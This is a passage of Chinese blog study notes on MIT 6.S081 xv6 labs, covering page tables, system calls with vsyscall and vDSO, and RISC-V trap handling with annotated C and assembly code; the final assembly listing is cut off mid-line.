<p>我们这里先不考虑这些复杂情况，做Lab的时候只需要知道进程地址空间是<code>exec</code>创建的，进程页表是<code>proc_pagetable</code>创建的</p>
<h2 id="页表放在哪"><a href="#页表放在哪" class="headerlink" title="页表放在哪"></a>页表放在哪</h2><p>放在内存里面（是虚拟内存）。准确的说，是在内存的内核空间（kernel address space）里。在RISC-V中，SATP寄存器保存当前进程的页表地址，通过切换SATP的值来切换进程页表，MMU通过这个地址去找页表（先去TLB找，那里放的是页表的缓存）。<br>x86的寄存器是CR3，作用类似。</p>
<h2 id="这么多年过去了页大小怎么还是4K"><a href="#这么多年过去了页大小怎么还是4K" class="headerlink" title="这么多年过去了页大小怎么还是4K"></a>这么多年过去了页大小怎么还是4K</h2><p>如果你执行<code>getconf PAGE_SIZE</code>看一下，大概率还是<code>4096</code>。<br>页表的级数一直在增加，ARM的嵌入式soc（比如Cortex-A系列）一般是二级页表，Linux一开始也是二级，后来有了3级和4级页表。然而这么多年过去了，页表大小基本还是4k。</p>
<p>透明大页</p>
<h2 id="Lab作业笔记"><a href="#Lab作业笔记" class="headerlink" title="Lab作业笔记"></a>Lab作业笔记</h2><p>这个Lab是第四章内存管理的配套Lab，做之前推荐还是看一下第四章的讲义。涉及到的几个函数在<code>vm.c</code>中</p>
<h3 id="Speed-up-system-calls"><a href="#Speed-up-system-calls" class="headerlink" title="Speed up system calls"></a>Speed up system calls</h3><blockquote>
<p>Some operating systems (e.g., Linux) speed up certain system calls by sharing data in a read-only region between userspace and the kernel. This eliminates the need for kernel crossings when performing these system calls.</p>
</blockquote>
<p>仿照Linux通过共享内存来加快syscall。一开始看lwm这篇：<span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzE4NDExLw==">How to speed up system calls<i class="fa fa-external-link-alt"></i></span> 02年的文章和<span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzE4NDE0Lw==">Patch<i class="fa fa-external-link-alt"></i></span>没看懂是要干嘛，后来搜了一下vsyscall才明白这个Lab想让我们做什么。  </p>
<blockquote>
<p>vsyscall 或 virtual system call 是第一种也是最古老的一种用于加快系统调用的机制。 vsyscall 的工作原则其实十分简单。Linux 内核在用户空间映射一个包含一些变量及一些系统调用的实现的内存页。<br>不过后来vsyscall几乎都换成vDSO和vvar了（安全原因），现在不少发行版默认禁用这个的。  </p>
</blockquote>
<p>知道干什么就好办了，我们照着课程提示先看<code>user/ulib.c</code>中的<code>ugetpid()</code>，这里已经将共享地址<code>USYSCALL</code>转成usyscall结构体，然后返回pid</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">ugetpid</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">usyscall</span> *<span class="title">u</span> =</span> (<span class="keyword">struct</span> usyscall *)USYSCALL;</span><br><span class="line">  <span class="keyword">return</span> u-&gt;pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们只要在<code>kernel/proc.h</code>中补全USYSCALL的映射（mapping），这个仿照trapframe就好了，在<code>proc.h</code>中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">usyscall</span> *<span class="title">usyscall</span>    // <span class="title">data</span> <span class="title">page</span> <span class="title">for</span> <span class="title">getpid</span> <span class="title">syscall</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">trapframe</span>;</span> <span class="comment">// data page for trampoline.S</span></span><br></pre></td></tr></table></figure>
<p>然后在<code>proc.c</code>设置映射和读权限（PTE_U、PTE_R，详见xv6文档）。我们继续照着trapframe的写法加上：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// map the getpid (for systemcall return)</span></span><br><span class="line"><span class="keyword">if</span> (mappages(pagetable, USYSCALL, PGSIZE,</span><br><span class="line">            (uint64)(p-&gt;usyscall), PTE_R | PTE_U) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    uvmfree(pagetable, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在<code>allocproc()</code>中分配，在<code>freeproc()</code>中释放内存（这个直接照抄trapframe的分配和释放就可以了）。注意还要在<code>proc.c</code>中的<code>proc_freepagetable</code>释放一下<code>uvmunmap(pagetable, USYSCALL, 1, 0);</code></p>
<h3 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h3><p>这个也简单，实现一个打印页表方便下面调试。</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9uaWV5b25nLmdpdGh1Yi5pby93aWtpX2NwdS9DUFUlRTQlQkQlOTMlRTclQjMlQkIlRTYlOUUlQjYlRTYlOUUlODQtTU1VLmh0bWw=">CPU体系架构-MMU<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTG95ZW5XYW5nL3AvMTE0MDY2OTMuaHRtbA==">（一）ARMv8 MMU及Linux页表映射<i class="fa fa-external-link-alt"></i></span>  </p>
<p>阅读更多</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzE4NDExLw==">How to speed up system calls<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly92dmwubWUvMjAxOS8wNi9saW51eC1zeXNjYWxsLWFuZC12c3lzY2FsbC12ZHNvLWluLXg4Ni8=">x86 架构下 Linux 的系统调用与 vsyscall, vDSO<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvaHRtbC9sYXRlc3QveDg2L3B0aS5odG1s">17. Page Table Isolation (PTI)<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L2tlcm5lbC1tb2RlL2RlZmVuc2UvaXNvbGF0aW9uL3VzZXIta2VybmVsL2twdGk=">KPTI - Kernel Page Table Isolation CTF-Wiki<i class="fa fa-external-link-alt"></i></span>  </p>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>6.S081</tag>
        <tag>page table</tag>
      </tags>
  </entry>
  <entry>
    <title>6.S081 Lab Syscall 笔记</title>
    <url>/6.s081-lab-syscall/</url>
    <content><![CDATA[<p>暑假摸了一个月的鱼，回来接着做Lab。2021 spring 的6.S081已经开始了，直接做2021的吧（看了一下好像没有太大变化）。而且xv6-labs-2021这个repo貌似修复了Archlinux上新版gdb不兼容的问题，不用再降级包或者去用Ubuntu 20了。</p>
<span id="more"></span>

<p>注：目前现在2021的repo由于进度原因只有riscv、util和syscall三个分支，没有master分支，所以会报警告：<code>warning: remote HEAD refers to nonexistent ref, unable to checkout.</code>这个不用管。</p>
<h2 id="关于syscall"><a href="#关于syscall" class="headerlink" title="关于syscall"></a>关于syscall</h2><p>syscall一般很少直接用，用c语言写东西的时候大部分都是通过wrapper函数间接调用syscall。其他语言里用到系统调用的就更少了，我就只在某次用golang的网络库实现traceroute的时候调用过一次。</p>
<p>之前对syscall的印象是x86下<code>int 80</code>中断，从用户空间切到内核空间。常用的比如read, write, open, close啊，以及mmap等等。</p>
<p>6.S081改用risc-v, 不太一样。<br>risc-v中有三种模式：<br>User-mode，用户模式。普通应用会在这个模式下运行。<br>Supervisor-mode， 特权模式。<br>Machine-mode，机器模式，需要的权限比supervisor模式还要高。一些嵌入式几乎整个都运行在这种模式下，完整的操作系统就只有bootloader等是在M模式下，大部分任务都在U和S模式下。<br>关于risc-v的特权模式可以参考手册：The RISC-V Instruction Set Manual<br>Volume II: Privileged Architecture</p>
<p>进入syscall是通过ecall（环境调用）指令，从u模式进入s模式，结束后使用<code>sret</code>指令返回。</p>
<p>还有就是讲义中将异常（exception）和中断（interrupt）都算做陷阱（trap），一开始看讲义的时候一直以为这是三个不同的东西。后来发现涉及到supervisor和machine模式的都算做trap。</p>
<h2 id="Lab2"><a href="#Lab2" class="headerlink" title="Lab2"></a>Lab2</h2><p>Lab2就两个，简单熟悉一下系统调用，不难。</p>
<h3 id="System-call-tracing-moderate"><a href="#System-call-tracing-moderate" class="headerlink" title="System call tracing (moderate)"></a>System call tracing (moderate)</h3><p>这个不是很难，不过要改的东西很多，按照提示一点一点做就行了。</p>
<h2 id="Linux下的syscall"><a href="#Linux下的syscall" class="headerlink" title="Linux下的syscall"></a>Linux下的syscall</h2><p>这里说一下linux中系统调用相关的东西，6.S081的课和Lab没怎么提到，但是这一部分写业务用到的比较多。linux下的syscall一般直接用glibc提供的，现在一般x86下也不用<code>int 0x80</code>了。由于syscall的调用消耗很高，所以有vsyscall和vDSO等技术。</p>
<p>以date命令为例，我们用strace看一下系统调用，可以看到clock_gettime调用花了0.000006s</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$strace</span> -cT</span><br><span class="line">strace: -T/--syscall-times has no effect with -c/--summary-only</span><br><span class="line">Tue Mar 22 07:16:09 PM CST 2022</span><br><span class="line">% time     seconds  usecs/call     calls    errors syscall</span><br><span class="line">------ ----------- ----------- --------- --------- ----------------</span><br><span class="line"> 22.18    0.000057           6         9           mmap</span><br><span class="line"> 12.45    0.000032           5         6           close</span><br><span class="line"> 12.45    0.000032           5         6           newfstatat</span><br><span class="line"> 11.67    0.000030           7         4           mprotect</span><br><span class="line">  7.00    0.000018           4         4           openat</span><br><span class="line">  4.28    0.000011           3         3           <span class="built_in">read</span></span><br><span class="line">  4.28    0.000011          11         1           munmap</span><br><span class="line">  4.28    0.000011           3         3           brk</span><br><span class="line">  2.72    0.000007           7         1           write</span><br><span class="line">  2.33    0.000006           1         4           pread64</span><br><span class="line">  2.33    0.000006           6         1           clock_gettime</span><br><span class="line">  2.33    0.000006           6         1           getrandom</span><br><span class="line">  1.95    0.000005           5         1           lseek</span><br><span class="line">  1.95    0.000005           2         2         1 arch_prctl</span><br><span class="line">  1.95    0.000005           5         1           set_tid_address</span><br><span class="line">  1.95    0.000005           5         1           set_robust_list</span><br><span class="line">  1.95    0.000005           5         1           prlimit64</span><br><span class="line">  1.95    0.000005           5         1           rseq</span><br><span class="line">  0.00    0.000000           0         1         1 access</span><br><span class="line">  0.00    0.000000           0         1           execve</span><br><span class="line">------ ----------- ----------- --------- --------- ----------------</span><br><span class="line">100.00    0.000257           4        52         2 total</span><br></pre></td></tr></table></figure>

<p>vsyscall是将频繁使用的syscall从kernelsapce映射到userspace的页，这样就不需要切换usersapce和kernelspace了。这样对<code>gettimeofday</code>这样的对时间很敏感的系统调用好处很大。但是vsyscall将kernelspace一段固定的地址映射到userspace，存在安全问题。现在已经不常用vsyscall了，基本都改用vDSO了。</p>
<p>vDSO（virtual dynamic shared object）是一个虚拟的动态库(linux-vdso.so.1)，同样运行在userspace，这样就不需要软中断了。vDSO一个好处是利用ASLR（address space layout randomization）减少了vsyscall的安全问题。现在linux发行版一般都开了地址随机化（可以看<code>/proc/sys/kernel/randomize_va_space</code>），调试内核的时候我建议临时把这个关掉。另一个好处是把不同平台的syscall封装了，给了一套统一的ABI，动态链接库的ABI从kernel的libc独立出去了。</p>
<p>另一个加快系统调用的技术是快速系统调用（fast system call），这个是x86的一些  指令，直接切换特权，也不需要中断。 </p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvbWFuMi9zeXNjYWxscy4yLmh0bWw=">https://man7.org/linux/man-pages/man2/syscalls.2.html<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9maWxpcHBvLmlvL2xpbnV4LXN5c2NhbGwtdGFibGUv">https://filippo.io/linux-syscall-table/<i class="fa fa-external-link-alt"></i></span>  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzYwNDI4Ny8=">Anatomy of a system call, part 1<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzYwNDUxNS8=">Anatomy of a system call, part 2<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzQ0NjUyOC8=">On vsyscalls and the vDSO<i class="fa fa-external-link-alt"></i></span> 这个文章有点老，不感兴趣不用看<br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnBhY2thZ2VjbG91ZC5pby90aGUtZGVmaW5pdGl2ZS1ndWlkZS10by1saW51eC1zeXN0ZW0tY2FsbHMv">The Definitive Guide to Linux System Calls<i class="fa fa-external-link-alt"></i></span> 相当详细的一片文章，强烈推荐<br><span class="exturl" data-url="aHR0cHM6Ly9hcnRodXJjaGlhby5hcnQvYmxvZy9zeXN0ZW0tY2FsbC1kZWZpbml0aXZlLWd1aWRlLXpoLyMxLSVFNyVCMyVCQiVFNyVCQiU5RiVFOCVCMCU4MyVFNyU5NCVBOCVFNiU5OCVBRiVFNCVCQiU4MCVFNCVCOSU4OA==">[译] Linux 系统调用权威指南（2016）<i class="fa fa-external-link-alt"></i></span> 上面那篇的中文翻译  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL01pbnRDTi9saW51eC1pbnNpZGVzLXpo">linux-insides-zh<i class="fa fa-external-link-alt"></i></span> 中文翻译<br><span class="exturl" data-url="aHR0cHM6Ly92dmwubWUvMjAxOS8wNi9saW51eC1zeXNjYWxsLWFuZC12c3lzY2FsbC12ZHNvLWluLXg4Ni8=">x86 架构下 Linux 的系统调用与 vsyscall, vDSO<i class="fa fa-external-link-alt"></i></span>  </p>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>6.S081</tag>
        <tag>syscall</tag>
      </tags>
  </entry>
  <entry>
    <title>6.S081 Lab Traps 笔记</title>
    <url>/6.S081-lab-trap/</url>
    <content><![CDATA[<p>这个Lab跟其他的比起来挺简单的，主要是汇编要去翻翻手册，简单说一下吧。顺便讲一下中断之类的东西。</p>
<span id="more"></span>

<h2 id="xv6的Trap"><a href="#xv6的Trap" class="headerlink" title="xv6的Trap"></a>xv6的Trap</h2><p>xv6的trap包括interrupt这些，就是大部分切入内核态的东西都算作中断。以<code>write</code>系统调用为例，一般是<code>ecall</code>指令进入特权模式，然后<code>uservec</code>保存 寄存器进入内核态，然后<code>usertrap</code>, 然后syscall执行16号<code>sys_write</code>, 执行完之后<code>usertrapret</code>调用<code>userret</code>返回用户空间</p>
<h3 id="相关的寄存器和指令"><a href="#相关的寄存器和指令" class="headerlink" title="相关的寄存器和指令"></a>相关的寄存器和指令</h3><p>RISC-V的汇编指令和ARM的还是有挺多不一样的地方，我一开始凭着本科学的那点ARM汇编的印象，搞错了好几次（最后还是翻手册的时候才意识到我错了，太坑了，说好的RISC-V和ARM指令差不多呢）</p>
<p><img src="/6.S081-lab-trap/1651803380.png"></p>
<p>通用寄存器和ARM差不多，a0-a2这些是函数的参数，t0-t9和s0-s7这些都是保存临时值的（saved registers），区别是t开头的是caller-saved，可以被其他函数返回值更改，s开头的是callee-saved，不会被函数返回值之类的的东西更改。</p>
<p>ECALL会进入特权模式，这个syscall的时候讲过了不多说了。risc-v跟中断有关的寄存器比较多，建议下面看到什么直接去翻手册：<span class="exturl" data-url="aHR0cDovL3Jpc2N2Ym9vay5jb20vY2hpbmVzZS9SSVNDLVYtUmVhZGVyLUNoaW5lc2UtdjJwMS5wZGY=">RISC-V 手册<i class="fa fa-external-link-alt"></i></span>  </p>
<p><img src="/6.S081-lab-trap/1651762525.png"></p>
<p>在RISC-V中，下面这些跟中断有关的寄存器属于CSR（Control and Status Registers）寄存器</p>
<p>SP寄存器： 栈寄存器，不说了<br>PC寄存器： 程序计数器，不说了<br>SATP寄存器： 用来控制分页的特权模式<br>STVEC寄存器：中断向量基址寄存器<br>SEPC寄存器：记录触发中断的向量地址，用来trap返回时恢复<br>SSRATCH寄存器：一般通过csrrw指令交换，在用户态保存内核栈的地址，在内核态值为0（可以通过这个判断是否处于内核态）<br>SCAUSE寄存器：中断类型和原因<br>STVAL寄存器：用来存储其他异常有关的东西</p>
<p>SIE寄存器：Supervisor Interrupt Enable， 中断使能<br>SIP寄存器：记录每种中断是否被触发<br>SSTAUTS寄存器：也是记录状态  </p>
<p>再简单说一下用到的指令：</p>
<p>sd指令（Store Double）<br>sd rs2, offset(rs1)<br>将 x[rs2]中的 8 字节存入内存地址 x[rs1]+sign-extend(offset)。</p>
<p>ld指令（load double，双字加载）<br>ld rd, offset(rs1) x[rd] &#x3D; M[x[rs1] + sext(offset)][63:0]<br>双字加载 (Load Doubleword). I-type, RV32I and RV64I.<br>从地址 x[rs1] + sign-extend(offset)读取八个字节，写入 x[rd]。</p>
<p><img src="/6.S081-lab-trap/1651803349.png"></p>
<p>读写CSR寄存器的指令：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 控制状态寄存器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CSR Read Write, 将csr读入rd， 同时将zimm写入csr（原子操作）</span></span><br><span class="line"><span class="symbol">csrrw</span> rd, csr, zimm </span><br><span class="line"><span class="comment"># Control ans Status Register Read, 读控制状态寄存器, 读取csr</span></span><br><span class="line"><span class="symbol">csrr</span> rd, csr</span><br><span class="line"><span class="comment"># CSR Write， 写控制状态寄存器, 作用相当于将rs1的值写入csr</span></span><br><span class="line"><span class="symbol">csrw</span> csr, rs1</span><br></pre></td></tr></table></figure>

<p>还有csrs和csrc，用来将csr指定位置的值置为0或1。此外还有csrrs、csrrc这些，用来读取（read）一个csr的值然后, 将csr中特定的bit置为0&#x2F;1，trap的相关操作没有涉及到，暂时不用管。</p>
<p>然后是中断切换的指令</p>
<p>ecall：切换特权模式触发中断<br>sret：从S MODE（内核态）返回用户态，将PC的值设置为SEPC<br>ebreak：断点（调试的时候用）<br>mret：从M MODE（机器态）返回内核态，将PC置为MEPC（这个不用管，这个Lab没涉及到）</p>
<p>然后是用来保证内存屏障的指令，用来在更改页表的时候刷新内存屏障的</p>
<p>sfemce.vma rs1, rs2<br>虚拟内存屏障(Fence Virtual Memory). R-type, RV32I and RV64I 特权指令。<br>根据后续的虚拟地址翻译对之前的页表存入进行排序。当 rs2&#x3D;0 时，所有地址空间的翻译都<br>会受到影响；否则，仅对 x[rs2]标识的地址空间的翻译进行排序。当 rs1&#x3D;0 时，对所选地址<br>空间中的所有虚拟地址的翻译进行排序；否则，仅对其中包含虚拟地址 x[rs1]的页面地址翻<br>译进行排序。</p>
<h3 id="Trap种类"><a href="#Trap种类" class="headerlink" title="Trap种类"></a>Trap种类</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// xv6中用户态trap的代码</span></span><br><span class="line"><span class="comment">// handle an interrupt, exception, or system call from user space.</span></span><br><span class="line"><span class="comment">// called from trampoline.S</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((r_sstatus() &amp; SSTATUS_SPP) != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;usertrap: not from user mode&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send interrupts and exceptions to kerneltrap(),</span></span><br><span class="line">  <span class="comment">// since we&#x27;re now in the kernel.</span></span><br><span class="line">  w_stvec((uint64)kernelvec);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// save user program counter.</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = r_sepc();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(r_scause() == <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="comment">// system call</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sepc points to the ecall instruction,</span></span><br><span class="line">    <span class="comment">// but we want to return to the next instruction.</span></span><br><span class="line">    p-&gt;trapframe-&gt;epc += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// an interrupt will change sstatus &amp;c registers,</span></span><br><span class="line">    <span class="comment">// so don&#x27;t enable until done with those registers.</span></span><br><span class="line">    intr_on();</span><br><span class="line"></span><br><span class="line">    syscall();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>((which_dev = devintr()) != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// ok</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, r_scause(), p-&gt;pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  usertrapret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Trap在xv6里面指的是用户空间和内核空间的切换，包括系统调用、page fault、中断等。（<strong>xv6这里的Trap是一个统称</strong>，跟其他地方的称呼习惯不一样，比如CSAPP和一些linux的书习惯把syscall之类的东西叫trap，而把键盘I&#x2F;O这种interrupt叫做中断，<strong>大部分其他的书认为trap、interrupt、fault是三种不同的东西</strong>）</p>
<p>一般Trap干了这些事：</p>
<p>保存32个用户寄存器<br>保存pc和sp寄存器<br>切到supervisor mode<br>从user page table切到kernel page table<br>进入内核态执行程序</p>
<p>完成这些过程的就是<code>kernel/trampoline.S</code>中的<code>uservec</code>函数，加了点注释，直接看注释吧。</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.globl</span> uservec</span><br><span class="line"><span class="symbol">uservec:</span>    </span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">        <span class="comment"># trap.c sets stvec to point here, so</span></span><br><span class="line">        <span class="comment"># traps from user space start here,</span></span><br><span class="line">        <span class="comment"># in supervisor mode, but with a</span></span><br><span class="line">        <span class="comment"># user page table.</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># sscratch points to where the process&#x27;s p-&gt;trapframe is</span></span><br><span class="line">        <span class="comment"># mapped into user space, at TRAPFRAME.</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        </span><br><span class="line">  <span class="comment"># swap a0 and sscratch</span></span><br><span class="line">        <span class="comment"># so that a0 is TRAPFRAME</span></span><br><span class="line">        csrrw a0, sscratch, a0</span><br><span class="line"></span><br><span class="line">        <span class="comment"># save the user registers in TRAPFRAME</span></span><br><span class="line">        <span class="comment"># sd（store指令)，sd  rs2, offset(rs1)  ，将rs1寄存器的值加上offset偏移存入rs2</span></span><br><span class="line">        sd ra, <span class="number">40</span>(a0) # return address, 返回地址</span><br><span class="line">        sd <span class="built_in">sp</span>, <span class="number">48</span>(a0) # stack pointer， 栈指针</span><br><span class="line">        sd gp, <span class="number">56</span>(a0) # gloabl pointer，全局指针寄存器</span><br><span class="line">        sd tp, <span class="number">64</span>(a0) # thread pointer，线程指针</span><br><span class="line">        sd t0, <span class="number">72</span>(a0) # t0-t2 是临时寄存器</span><br><span class="line">        sd t1, <span class="number">80</span>(a0)</span><br><span class="line">        sd t2, <span class="number">88</span>(a0)</span><br><span class="line">        sd <span class="built_in">s0</span>, <span class="number">96</span>(a0) # saved register</span><br><span class="line">        sd <span class="built_in">s1</span>, <span class="number">104</span>(a0)</span><br><span class="line">        sd <span class="built_in">a1</span>, <span class="number">120</span>(a0)  # a0-a7是<span class="meta">function</span> arguements，函数参数</span><br><span class="line">        sd <span class="built_in">a2</span>, <span class="number">128</span>(a0)</span><br><span class="line">        sd <span class="built_in">a3</span>, <span class="number">136</span>(a0)</span><br><span class="line">        sd <span class="built_in">a4</span>, <span class="number">144</span>(a0)</span><br><span class="line">        sd a5, <span class="number">152</span>(a0)</span><br><span class="line">        sd a6, <span class="number">160</span>(a0)</span><br><span class="line">        sd a7, <span class="number">168</span>(a0)</span><br><span class="line">        sd <span class="built_in">s2</span>, <span class="number">176</span>(a0) # saved registers，</span><br><span class="line">        sd <span class="built_in">s3</span>, <span class="number">184</span>(a0)</span><br><span class="line">        sd <span class="built_in">s4</span>, <span class="number">192</span>(a0)</span><br><span class="line">        sd <span class="built_in">s5</span>, <span class="number">200</span>(a0)</span><br><span class="line">        sd <span class="built_in">s6</span>, <span class="number">208</span>(a0)</span><br><span class="line">        sd <span class="built_in">s7</span>, <span class="number">216</span>(a0)</span><br><span class="line">        sd <span class="built_in">s8</span>, <span class="number">224</span>(a0)</span><br><span class="line">        sd <span class="built_in">s9</span>, <span class="number">232</span>(a0)</span><br><span class="line">        sd <span class="built_in">s10</span>, <span class="number">240</span>(a0)</span><br><span class="line">        sd <span class="built_in">s11</span>, <span class="number">248</span>(a0)</span><br><span class="line">        sd t3, <span class="number">256</span>(a0)</span><br><span class="line">        sd t4, <span class="number">264</span>(a0)</span><br><span class="line">        sd t5, <span class="number">272</span>(a0)</span><br><span class="line">        sd t6, <span class="number">280</span>(a0)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># save the user a0 in p-&gt;trapframe-&gt;a0</span></span><br><span class="line">        csrr t0, sscratch</span><br><span class="line">        sd t0, <span class="number">112</span>(a0)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># restore kernel stack pointer from p-&gt;trapframe-&gt;kernel_sp</span></span><br><span class="line">        ld <span class="built_in">sp</span>, <span class="number">8</span>(a0)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># make tp hold the current hartid, from p-&gt;trapframe-&gt;kernel_hartid</span></span><br><span class="line">        ld tp, <span class="number">32</span>(a0)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># load the address of usertrap(), p-&gt;trapframe-&gt;kernel_trap</span></span><br><span class="line">        ld t0, <span class="number">16</span>(a0)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># restore kernel page table from p-&gt;trapframe-&gt;kernel_satp</span></span><br><span class="line">        ld t1, <span class="number">0</span>(a0)</span><br><span class="line">        csrw satp, t1</span><br><span class="line">        sfence.vma zero, zero</span><br><span class="line"></span><br><span class="line">        <span class="comment"># a0 is no longer valid, since the kernel page</span></span><br><span class="line">        <span class="comment"># table does not specially map p-&gt;tf.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># jump to usertrap(), which does not return</span></span><br><span class="line">        jr t0</span><br></pre></td></tr></table></figure>



<p>与之对应的是<code>userret</code>，用来在返回userspace的时候恢复这些寄存器</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.globl</span> userret</span><br><span class="line"><span class="symbol">userret:</span></span><br><span class="line">        <span class="comment"># userret(TRAPFRAME, pagetable)</span></span><br><span class="line">        <span class="comment"># switch from kernel to user.</span></span><br><span class="line">        <span class="comment"># usertrapret() calls here.</span></span><br><span class="line">        <span class="comment"># a0: TRAPFRAME, in user page table.</span></span><br><span class="line">        <span class="comment"># a1: user page table, for satp.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># switch to the user page table.</span></span><br><span class="line">        将<span class="built_in">a1</span>的值写入satp，切换到user page table</span><br><span class="line">        csrw satp, <span class="built_in">a1</span></span><br><span class="line">        <span class="comment">#  sfence是虚拟内存屏障的指令，sfence.vma是用来通知处理器页表已经更改，需要刷新TLB缓存</span></span><br><span class="line">        sfence.vma zero, zero</span><br><span class="line"></span><br><span class="line">        <span class="comment"># put the saved user a0 in sscratch, so we</span></span><br><span class="line">        <span class="comment"># can swap it with our a0 (TRAPFRAME) in the last step.</span></span><br><span class="line">        ld t0, <span class="number">112</span>(a0)</span><br><span class="line">        csrw sscratch, t0</span><br><span class="line"></span><br><span class="line">        <span class="comment"># restore all but a0 from TRAPFRAME</span></span><br><span class="line">        <span class="comment"># ld a0, a1 是将a1的值load进a0，方向不要搞反了</span></span><br><span class="line">        ld ra, <span class="number">40</span>(a0) # return address, 返回地址</span><br><span class="line">        ld <span class="built_in">sp</span>, <span class="number">48</span>(a0) # stack pointer， 栈指针</span><br><span class="line">        ld gp, <span class="number">56</span>(a0) # gloabl pointer，全局指针寄存器</span><br><span class="line">        ld tp, <span class="number">64</span>(a0) # thread pointer，线程指针</span><br><span class="line">        ld t0, <span class="number">72</span>(a0) # t0-t2 是临时寄存器</span><br><span class="line">        ld t1, <span class="number">80</span>(a0)</span><br><span class="line">        ld t2, <span class="number">88</span>(a0)</span><br><span class="line">        ld <span class="built_in">s0</span>, <span 